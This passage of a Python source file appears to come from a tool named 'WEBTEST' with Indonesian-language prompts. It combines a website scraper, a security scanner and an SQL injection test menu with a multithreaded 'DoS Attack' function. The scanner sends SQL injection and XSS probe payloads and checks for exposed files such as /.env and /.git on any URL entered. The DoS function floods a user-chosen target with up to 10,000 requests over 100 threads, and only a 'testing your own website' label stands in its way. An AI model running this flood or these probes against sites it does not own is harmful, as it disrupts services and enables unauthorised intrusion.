            self.typewriter_effect("\n🔒 Security Headers:")
            for header, value in info['security_headers'].items():
                self.typewriter_effect(f"   {header}: {value}")
            
            # Security rating
            important_headers = ['Strict-Transport-Security', 'Content-Security-Policy', 
                               'X-Content-Type-Options', 'X-Frame-Options']
            missing = [h for h in important_headers if h not in info['security_headers']]
            
            if not missing:
                self.typewriter_effect("\n✅ Excellent security headers configuration")
            elif len(missing) <= 2:
                self.typewriter_effect(f"\n⚠️ Missing some important security headers: {', '.join(missing)}")
            else:
                self.typewriter_effect(f"\n❌ Poor security headers - missing: {', '.join(missing)}")
        else:
            self.typewriter_effect("\n⚠️ No security headers found")
        
        self.typewriter_effect("\n✅ Website information gathering complete")
    
    def scan_website(self, url):
        """Perform comprehensive security scan on a website"""
        self.typewriter_effect(f"\n🔍 Starting security scan for: {url}")
        
        # Get basic website info first
        info = self.get_web_info(url)
        if not info:
            return None
            
        # Create scan results dictionary
        scan_results = {
            'url': url,
            'domain': info['domain'],
            'ip_address': info['ip_address'],
            'security_score': 0,
            'vulnerabilities': [],
            'security_issues': [],
            'recommendations': [],
            'open_ports': [],
            'ssl_info': {},
            'directory_listing': [],
            'exposed_files': [],
            'common_vulnerabilities': []
        }
        
        # Check SSL/TLS if HTTPS
        if info['is_secure']:
            self.loading_animation("Analyzing SSL/TLS configuration")
            try:
                hostname = info['domain']
                context = ssl.create_default_context()
                with socket.create_connection((hostname, 443), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        version = ssock.version()
                        
                        scan_results['ssl_info'] = {
                            'certificate': {
                                'subject': dict(x[0] for x in cert['subject']),
                                'issuer': dict(x[0] for x in cert['issuer']),
                                'version': cert['version'],
                                'serial_number': cert['serialNumber'],
                                'not_before': cert['notBefore'],
                                'not_after': cert['notAfter'],
                            },
                            'connection': {
                                'protocol': version,
                                'cipher': cipher[0],
                                'bits': cipher[2],
                            }
                        }
                        
                        # Check certificate expiration
                        from datetime import datetime
                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_left = (not_after - datetime.now()).days
                        
                        if days_left < 0:
                            scan_results['security_issues'].append("SSL certificate has expired")
                            scan_results['vulnerabilities'].append({
                                'type': 'SSL Certificate Expired',
                                'severity': 'High',
                                'description': 'The SSL certificate has expired'
                            })
                        elif days_left < 30:
                            scan_results['security_issues'].append(f"SSL certificate expires in {days_left} days")
                            scan_results['vulnerabilities'].append({
                                'type': 'SSL Certificate Expiring Soon',
                                'severity': 'Medium',
                                'description': f'The SSL certificate expires in {days_left} days'
                            })
                        
                        # Check protocol version
                        if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                            scan_results['security_issues'].append(f"Using outdated protocol: {version}")
                            scan_results['vulnerabilities'].append({
                                'type': 'Outdated TLS Protocol',
                                'severity': 'High',
                                'description': f'Using outdated TLS protocol: {version}'
                            })
                        
                        # Check cipher strength
                        if cipher[2] < 128:
                            scan_results['security_issues'].append(f"Weak cipher: {cipher[0]} ({cipher[2]} bits)")
                            scan_results['vulnerabilities'].append({
                                'type': 'Weak Cipher',
                                'severity': 'Medium',
                                'description': f'Using weak cipher: {cipher[0]} ({cipher[2]} bits)'
                            })
            except Exception as e:
                scan_results['security_issues'].append(f"SSL/TLS analysis failed: {str(e)}")
        
        # Check for common directories and files
        self.loading_animation("Checking for exposed directories and files")
        common_paths = [
            '/.env', '/.git', '/.svn', '/.htaccess', '/.htpasswd',
            '/backup', '/backups', '/admin', '/administrator', '/login',
            '/wp-admin', '/wp-config.php', '/config.php', '/phpinfo.php',
            '/test.php', '/info.php', '/robots.txt', '/sitemap.xml',
            '/crossdomain.xml', '/clientaccesspolicy.xml'
        ]
        
        for path in common_paths:
            try:
                test_url = urljoin(url, path)
                response = self.session.head(test_url, timeout=5)
                
                if response.status_code == 200:
                    if path.endswith('/'):
                        scan_results['directory_listing'].append(test_url)
                    else:
                        scan_results['exposed_files'].append(test_url)
                        
                    scan_results['security_issues'].append(f"Exposed path: {path}")
                    scan_results['vulnerabilities'].append({
                        'type': 'Exposed Path',
                        'severity': 'Medium',
                        'description': f'Potentially sensitive file or directory exposed: {path}'
                    })
            except:
                continue
        
        # Check for common vulnerabilities
        self.loading_animation("Checking for common vulnerabilities")
        
        # Check for Clickjacking protection
        if 'X-Frame-Options' not in info['headers'] and 'Content-Security-Policy' not in info['headers']:
            scan_results['security_issues'].append("Missing Clickjacking protection")
            scan_results['vulnerabilities'].append({
                'type': 'Missing Clickjacking Protection',
                'severity': 'Medium',
                'description': 'Missing X-Frame-Options or Content-Security-Policy headers'
            })
        
        # Check for XSS protection
        if 'X-XSS-Protection' not in info['headers']:
            scan_results['security_issues'].append("Missing XSS protection header")
            scan_results['vulnerabilities'].append({
                'type': 'Missing XSS Protection',
                'severity': 'Medium',
                'description': 'Missing X-XSS-Protection header'
            })
        
        # Check for MIME type sniffing
        if 'X-Content-Type-Options' not in info['headers']:
            scan_results['security_issues'].append("Missing X-Content-Type-Options header")
            scan_results['vulnerabilities'].append({
                'type': 'Missing MIME Type Sniffing Protection',
                'severity': 'Low',
                'description': 'Missing X-Content-Type-Options header'
            })
        
        # Check for HSTS
        if info['is_secure'] and 'Strict-Transport-Security' not in info['headers']:
            scan_results['security_issues'].append("Missing HSTS header")
            scan_results['vulnerabilities'].append({
                'type': 'Missing HSTS',
                'severity': 'Medium',
                'description': 'Missing Strict-Transport-Security header for HTTPS site'
            })
        
        # Check for server version disclosure
        if 'Server' in info['headers']:
            server = info['headers']['Server']
            if any(char.isdigit() for char in server):
                scan_results['security_issues'].append("Server version disclosed")
                scan_results['vulnerabilities'].append({
                    'type': 'Server Version Disclosure',
                    'severity': 'Low',
                    'description': f'Server header reveals version: {server}'
                })
        
        # Check for PHP version disclosure
        if 'X-Powered-By' in info['headers']:
            powered_by = info['headers']['X-Powered-By']
            if 'PHP' in powered_by and any(char.isdigit() for char in powered_by):
                scan_results['security_issues'].append("PHP version disclosed")
                scan_results['vulnerabilities'].append({
                    'type': 'PHP Version Disclosure',
                    'severity': 'Low',
                    'description': f'X-Powered-By header reveals PHP version: {powered_by}'
                })
        
        # Check for common web vulnerabilities
        self.loading_animation("Testing for common web vulnerabilities")
        
        # Test for SQL Injection (basic test)
        try:
            test_url = urljoin(url, "?id=1' OR '1'='1")
            response = self.session.get(test_url, timeout=5)
            
            # Check for common SQL error messages
            sql_errors = [
                "SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB Provider",
                "SQLServer", "PostgreSQL query failed", "SQLite error"
            ]
            
            for error in sql_errors:
                if error in response.text:
                    scan_results['security_issues'].append("Potential SQL Injection vulnerability")
                    scan_results['vulnerabilities'].append({
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'description': f'Potential SQL Injection vulnerability detected: {error}'
                    })
                    break
        except:
            pass
        
        # Test for XSS (basic test)
        try:
            test_url = urljoin(url, "?q=<script>alert('XSS')</script>")
            response = self.session.get(test_url, timeout=5)
            
            if "<script>alert('XSS')</script>" in response.text:
                scan_results['security_issues'].append("Potential XSS vulnerability")
                scan_results['vulnerabilities'].append({
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'High',
                    'description': 'Potential XSS vulnerability detected'
                })
        except:
            pass
        
        # Calculate security score
        max_score = 100
        deductions = 0
        
        for vuln in scan_results['vulnerabilities']:
            if vuln['severity'] == 'High':
                deductions += 15
            elif vuln['severity'] == 'Medium':
                deductions += 8
            elif vuln['severity'] == 'Low':
                deductions += 3
        
        scan_results['security_score'] = max(0, max_score - deductions)
        
        # Generate recommendations
        if scan_results['security_score'] < 70:
            scan_results['recommendations'].append("Implement all missing security headers")
            scan_results['recommendations'].append("Regularly update server software and frameworks")
            scan_results['recommendations'].append("Perform regular security audits")
        
        if any(v['type'] == 'Exposed Path' for v in scan_results['vulnerabilities']):
            scan_results['recommendations'].append("Restrict access to sensitive files and directories")
            scan_results['recommendations'].append("Implement proper access controls")
        
        if any(v['type'] == 'SQL Injection' for v in scan_results['vulnerabilities']):
            scan_results['recommendations'].append("Use parameterized queries or prepared statements")
            scan_results['recommendations'].append("Implement input validation and sanitization")
        
        if any(v['type'] == 'Cross-Site Scripting (XSS)' for v in scan_results['vulnerabilities']):
            scan_results['recommendations'].append("Implement Content Security Policy (CSP)")
            scan_results['recommendations'].append("Sanitize user input and encode output")
        
        if info['is_secure'] and scan_results['ssl_info']:
            if scan_results['ssl_info']['connection']['protocol'] in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                scan_results['recommendations'].append("Upgrade to TLS 1.2 or higher")
            
            if scan_results['ssl_info']['connection']['bits'] < 128:
                scan_results['recommendations'].append("Use stronger cipher suites")
        
        return scan_results
    
    def display_scan_results(self, scan_results):
        """Display the scan results in a formatted way"""
        if not scan_results:
            self.typewriter_effect("❌ No scan results to display")
            return
        
        self.typewriter_effect("\n🔍 WEBSITE SECURITY SCAN RESULTS:")
        self.typewriter_effect("══════════════════════════════════════════════")
        
        # Basic Info
        self.typewriter_effect(f"\n🌐 Target: {scan_results['url']}")
        self.typewriter_effect(f"🖥️ Domain: {scan_results['domain']}")
        self.typewriter_effect(f"📡 IP Address: {scan_results['ip_address']}")
        
        # Security Score
        score = scan_results['security_score']
        if score >= 90:
            score_color = C['G']
            score_text = "Excellent"
        elif score >= 70:
            score_color = C['Y']
            score_text = "Good"
        elif score >= 50:
            score_color = C['Y']
            score_text = "Fair"
        else:
            score_color = C['R']
            score_text = "Poor"
            
        self.typewriter_effect(f"\n🛡️ Security Score: {score_color}{score}/100 ({score_text}){C['RESET']}")
        
        # SSL/TLS Info
        if scan_results['ssl_info']:
            self.typewriter_effect("\n🔒 SSL/TLS Information:")
            ssl_info = scan_results['ssl_info']
            
            # Certificate info
            cert = ssl_info['certificate']
            self.typewriter_effect(f"   Certificate Subject: {cert['subject'].get('commonName', 'N/A')}")
            self.typewriter_effect(f"   Certificate Issuer: {cert['issuer'].get('commonName', 'N/A')}")
            self.typewriter_effect(f"   Certificate Valid Until: {cert['not_after']}")
            
            # Connection info
            conn = ssl_info['connection']
            self.typewriter_effect(f"   Protocol: {conn['protocol']}")
            self.typewriter_effect(f"   Cipher: {conn['cipher']} ({conn['bits']} bits)")
        
        # Vulnerabilities
        if scan_results['vulnerabilities']:
            self.typewriter_effect(f"\n{C['R']}🚨 Vulnerabilities Found:{C['RESET']}")
            for vuln in scan_results['vulnerabilities']:
                if vuln['severity'] == 'High':
                    severity_color = C['R']
                elif vuln['severity'] == 'Medium':
                    severity_color = C['Y']
                else:
                    severity_color = C['W']
                    
                self.typewriter_effect(f"   {severity_color}[{vuln['severity']}] {vuln['type']}{C['RESET']}")
                self.typewriter_effect(f"      {vuln['description']}")
        else:
            self.typewriter_effect(f"\n{C['G']}✅ No vulnerabilities detected{C['RESET']}")
        
        # Security Issues
        if scan_results['security_issues']:
            self.typewriter_effect(f"\n{C['Y']}⚠️ Security Issues:{C['RESET']}")
            for issue in scan_results['security_issues']:
                self.typewriter_effect(f"   • {issue}")
        
        # Exposed Files and Directories
        if scan_results['exposed_files']:
            self.typewriter_effect(f"\n{C['R']}📁 Exposed Files:{C['RESET']}")
            for file in scan_results['exposed_files']:
                self.typewriter_effect(f"   • {file}")
        
        if scan_results['directory_listing']:
            self.typewriter_effect(f"\n{C['R']}📂 Directory Listing Enabled:{C['RESET']}")
            for dir in scan_results['directory_listing']:
                self.typewriter_effect(f"   • {dir}")
        
        # Recommendations
        if scan_results['recommendations']:
            self.typewriter_effect(f"\n{C['B']}💡 Recommendations:{C['RESET']}")
            for rec in scan_results['recommendations']:
                self.typewriter_effect(f"   • {rec}")
        
        self.typewriter_effect("\n✅ Website security scan complete")

# ====== DoS Attack ======
def dos_attack():
    type_print(f"{C['R']}{EMO['dos']} Customizable DoS Attack (for testing your own website){C['RESET']}")
    target_url = input_colored(f"{EMO['dos']} Masukkan URL target (http/https):")
    
    if not re.match(r"^https?://", target_url):
        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
        return
    
    # Input validation
    while True:
        try:
            requests_count = input_colored("Jumlah requests (Default 1000 Max 10000):").strip()
            if not requests_count:
                requests_count = 1000
            else:
                requests_count = int(requests_count)
                if requests_count > 10000:
                    type_print(f"{C['Y']}{EMO['warn']} Maksimum 10000, menggunakan 10000{C['RESET']}")
                    requests_count = 10000
            break
        except ValueError:
            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
    
    while True:
        try:
            thread_count = input_colored("Jumlah threads (Default 10 Max 100):").strip()
            if not thread_count:
                thread_count = 10
            else:
                thread_count = int(thread_count)
                if thread_count > 100:
                    type_print(f"{C['Y']}{EMO['warn']} Maksimum 100, menggunakan 100{C['RESET']}")
                    thread_count = 100
            break
        except ValueError:
            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
    
    while True:
        try:
            delay = input_colored("Delay antar requests dalam detik (Default 0.1):").strip()
            if not delay:
                delay = 0.1
            else:
                delay = float(delay)
            break
        except ValueError:
            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
    
    # Confirmation
    type_print(f"\n{C['BOLD']}{EMO['dos']} Konfigurasi Attack:{C['RESET']}")
    type_print(f"   Target: {target_url}")
    type_print(f"   Total Requests: {requests_count}")
    type_print(f"   Threads: {thread_count}")
    type_print(f"   Delay: {delay} detik")
    
    confirm = input_colored("\nYakin ingin meluncurkan attack? (yes/no):").lower()
    if confirm != 'yes':
        type_print(f"{C['Y']}{EMO['warn']} Attack dibatalkan{C['RESET']}")
        return
    
    # Attack statistics
    successful_requests = 0
    failed_requests = 0
    start_time = time.time()
    DOS_STOP_EVENT.clear()
    
    # Worker function
    def attack_worker(url, req_count, delay_time):
        nonlocal successful_requests, failed_requests
        thread_session = requests.Session()
        thread_session.headers.update({"User-Agent": UA})
        for _ in range(req_count):
            if DOS_STOP_EVENT.is_set():
                break
            try:
                response = thread_session.get(url, timeout=5)
                if response.status_code == 200:
                    successful_requests += 1
                else:
                    failed_requests += 1
            except:
                failed_requests += 1
            time.sleep(delay_time)
    
    # Calculate requests per thread
    requests_per_thread = requests_count // thread_count
    remaining_requests = requests_count % thread_count
    
    # Start threads
    type_print(f"\n{C['R']}{EMO['dos']} Meluncurkan DoS attack... Tekan Ctrl+C untuk menghentikan{C['RESET']}")
    threads = []
    
    for i in range(thread_count):
        # Distribute remaining requests to first few threads
        req_count = requests_per_thread + (1 if i < remaining_requests else 0)
        if req_count > 0:
            t = threading.Thread(target=attack_worker, args=(target_url, req_count, delay))
            t.daemon = True
            t.start()
            threads.append(t)
    
    # Progress monitoring
    try:
        while any(t.is_alive() for t in threads):
            elapsed = time.time() - start_time
            reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
            
            # Bersihkan kode ANSI sebelum mencetak
            clean_text = clean_ansi(f"\r{C['R']}⚡ Status: {successful_requests + failed_requests}/{requests_count} requests | "
                           f"Success: {successful_requests}✅| "
                           f"Failed: {failed_requests} | "
                           f"Rate: {reqs_per_sec:.1f} reqs/sec{C['RESET']}")
            sys.stdout.write(clean_text)
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        DOS_STOP_EVENT.set()
        type_print(f"\n{C['Y']}{EMO['warn']} Attack dihentikan oleh pengguna{C['RESET']}")
    
    # Final statistics
    elapsed = time.time() - start_time
    reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
    
    type_print(f"\n\n{C['BOLD']}{EMO['dos']} Hasil Attack:{C['RESET']}")
    type_print(f"   Total Requests: {successful_requests + failed_requests}")
    type_print(f"   Successful: {successful_requests}")
    type_print(f"   Failed: {failed_requests}")
    type_print(f"   Duration: {elapsed:.2f} detik")
    type_print(f"   Request Rate: {reqs_per_sec:.1f} requests/detik")
    
    # Tampilkan IP publik setelah attack
    ip = get_public_ip()
    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")

def scrape_flow():
    url = input_colored(f"{EMO['net']} Masukkan URL target (https://...):")
    if not re.match(r"^https?://", url):
        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
        return
    
    outdir = choose_dir_for(url)
    ensure_dir(outdir)
    ensure_dir(os.path.join(outdir, "assets", "css"))
    ensure_dir(os.path.join(outdir, "assets", "js"))
    ensure_dir(os.path.join(outdir, "assets", "img"))
    ensure_dir(os.path.join(outdir, "assets", "icons"))
    
    type_print(f"{C['C']}{EMO['search']} Mengambil HTML...{C['RESET']}", 0.005)
    STOP_EVENT.clear()
    t = threading.Thread(target=spinner, args=("Fetching",), daemon=True)
    t.start()
    try:
        html = fetch_html(url)
    except Exception as e:
        STOP_EVENT.set()
        t.join()
        type_print(f"{C['R']}Gagal mengambil halaman: {e}{C['RESET']}")
        return
    STOP_EVENT.set()
    t.join()
    type_print(f"{C['G']}{EMO['ok']} HTML didapat ({len(html):,} chars){C['RESET']}")
    write_text(os.path.join(outdir, "index.html"), html)
    type_print(f"{EMO['disk']} Disimpan: {C['Y']}{outdir}/index.html{C['RESET']}")
    
    assets = extract_assets(url, html)
    
    # Simpan meta ke file
    write_text(os.path.join(outdir, "meta.json"), json.dumps(assets["meta"], indent=2, ensure_ascii=False))
    
    while True:
        print(f"""
{C['BOLD']}{EMO['gear']} Menu Scraping — {C['Y']}WEBTEST{C['RESET']}
{C['GR']}Folder: {outdir}{C['RESET']}
  1) {EMO['down']} Download HTML
  2) {EMO['down']} Download CSS ({len(assets['css'])})
  3) {EMO['down']} Download JS ({len(assets['js'])})
  4) {EMO['down']} Download Assets (img/icons) ({len(assets['img']) + len(assets['icons'])})
  5) {EMO['down']} Download Meta Tags (jika ada)
  6) {EMO['down']} Download Full (HTML+CSS+JS+Assets+Meta)
  ketik 'exit' untuk keluar menu ini
""")
        choice = input_colored("Pilih opsi:")
        if choice.lower() == "exit":
            type_print(f"{C['M']}{EMO['exit']} Keluar dari menu scraping{C['RESET']}")
            break
        if choice == "1":
            # sudah tersimpan sebagai index.html
            type_print(f"{C['G']}{EMO['ok']} HTML sudah disimpan sebagai index.html{C['RESET']}")
        elif choice == "2":
            total = len(assets["css"])
            if not total:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada CSS terdeteksi.{C['RESET']}")
                continue
            type_print(f"{EMO['down']} Download CSS ({total})...")
            for url_css in assets["css"]:
                name = sanitize_folder(os.path.basename(urlparse(url_css).path) or "style.css")
                dest = os.path.join(outdir, "assets", "css", name)
                ok, er = download_file(url_css, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
        elif choice == "3":
            total = len(assets["js"])
            if not total:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada JS terdeteksi.{C['RESET']}")
                continue
            type_print(f"{EMO['down']} Download JS ({total})...")
            for url_js in assets["js"]:
                name = sanitize_folder(os.path.basename(urlparse(url_js).path) or "script.js")
                dest = os.path.join(outdir, "assets", "js", name)
                ok, er = download_file(url_js, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
        elif choice == "4":
            imgs = list(assets["img"])
            icons = list(assets["icons"])
            total = len(imgs) + len(icons)
            if not total:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada assets (img/icons).{C['RESET']}")
                continue
            type_print(f"{EMO['down']} Download Assets ({total})...")
            for u in imgs:
                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"img_{random.randint(1000,9999)}")
                dest = os.path.join(outdir, "assets", "img", name)
                ok, er = download_file(u, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
            for u in icons:
                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"icon_{random.randint(1000,9999)}")
                dest = os.path.join(outdir, "assets", "icons", name)
                ok, er = download_file(u, dest)
                msg = f"{C['G']}OK{C['RESET']}" if ok else f"{C['R']}FAIL: {er}{C['RESET']}"
                print(f"  - {name}: {msg}")
        elif choice == "5":
            meta_file = os.path.join(outdir, "meta.json")
            if os.path.exists(meta_file) and os.path.getsize(meta_file) > 2:
                type_print(f"{C['G']}{EMO['ok']} Meta tags disimpan: {meta_file}{C['RESET']}")
            else:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada meta tags signifikan.{C['RESET']}")
        elif choice == "6":
            # Full: pastikan semuanya diunduh
            type_print(f"{EMO['down']} Download Full dimulai...")
            # CSS
            for url_css in assets["css"]:
                name = sanitize_folder(os.path.basename(urlparse(url_css).path) or "style.css")
                dest = os.path.join(outdir, "assets", "css", name)
                download_file(url_css, dest)
            # JS
            for url_js in assets["js"]:
                name = sanitize_folder(os.path.basename(urlparse(url_js).path) or "script.js")
                dest = os.path.join(outdir, "assets", "js", name)
                download_file(url_js, dest)
            # IMG & ICONS
            for u in list(assets["img"]) + list(assets["icons"]):
                name = sanitize_folder(os.path.basename(urlparse(u).path) or f"res_{random.randint(1000,9999)}")
                sub = "icons" if u in assets["icons"] else "img"
                dest = os.path.join(outdir, "assets", sub, name)
                download_file(u, dest)
            # META sudah disimpan
            type_print(f"{C['G']}{EMO['ok']} Full download selesai. Cek folder: {outdir}{C['RESET']}")
        else:
            type_print(f"{C['R']}Pilihan tidak valid.{C['RESET']}")
    
    # tampilkan IP publik setelah keluar menu scraping
    ip = get_public_ip()
    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")

def scan_flow():
    scanner = WebsiteScanner()
    url = input_colored(f"{EMO['scan']} Masukkan URL target (https://...):")
    if not re.match(r"^https?://", url):
        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
        return
    
    # Get basic website info
    info = scanner.get_web_info(url)
    if info:
        scanner.display_web_info(info)
    
    # Perform security scan
    scan_results = scanner.scan_website(url)
    if scan_results:
        scanner.display_scan_results(scan_results)
    
    # Tampilkan IP publik setelah scan
    ip = get_public_ip()
    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")

def sql_injection_flow():
    scanner = WebsiteScanner()
    url = input_colored(f"{EMO['shield']} Masukkan URL target untuk SQL Injection Test (https://...):")
    if not re.match(r"^https?://", url):
        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
        return
    
    # Reset vulnerabilities list
    scanner.vulnerabilities = []
    
    # Perform SQL injection test
    scanner.sql_injection_test(url)
    
    # Display results
    if scanner.vulnerabilities:
        type_print(f"\n{C['R']}🚨 SQL Injection Vulnerabilities Found:{C['RESET']}")
        for vuln in scanner.vulnerabilities:
            if vuln['severity'] == 'Critical':
                severity_color = C['R']
            elif vuln['severity'] == 'High':
                severity_color = C['R']
            elif vuln['severity'] == 'Medium':
                severity_color = C['Y']
            else:
                severity_color = C['W']
                
            type_print(f"   {severity_color}[{vuln['severity']}] {vuln['type']}{C['RESET']}")
            type_print(f"      {vuln['description']}")
            
            if 'parameter' in vuln:
                type_print(f"      Parameter: {vuln['parameter']}")
            
            if 'payload' in vuln:
                type_print(f"      Payload: {vuln['payload']}")
            
            if 'database' in vuln:
                type_print(f"      Database: {vuln['database']}")
            
            if 'table' in vuln:
                type_print(f"      Table: {vuln['table']}")
            
            if 'data' in vuln:
                type_print(f"      Data: {vuln['data']}")
    else:
        type_print(f"\n{C['G']}✅ No SQL Injection vulnerabilities detected{C['RESET']}")
    
    # Tampilkan IP publik setelah test
    ip = get_public_ip()
    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")

def main():
    signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
    while True:
        banner()
        type_print(f"{C['W']}{EMO['rocket']} Selamat datang di {C['BOLD']}WEBTEST{C['RESET']}{C['W']} — pilih menu:{C['RESET']}", 0.003)
        print(f"""
{C['BOLD']}Menu Utama:{C['RESET']}
  1) {EMO['spider']} Scraping Website
  2) {EMO['scan']} Website Security Scanner
  3) {EMO['dos']} DoS Attack (for testing)
  4) {EMO['shield']} SQL Injection Test
  5) {EMO['exit']} Keluar
""")
        choice = input_colored("Pilihan kamu:")
        if choice == "1":
            scrape_flow()
            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
        elif choice == "2":
            scan_flow()
            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
        elif choice == "3":
            dos_attack()
            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
        elif choice == "4":
            sql_injection_flow()
            input(f"\n{C['GR']}Tekan Enter untuk kembali ke menu utama...{C['RESET']}")
        elif choice == "5":
            type_print(f"{C['M']}{EMO['exit']} Bye!{C['RESET']}")
            break
        else:
            type_print(f"{C['R']}Pilihan tidak valid.{C['RESET']}")
            time.sleep(1.2)

if __name__ == "__main__":
    main()
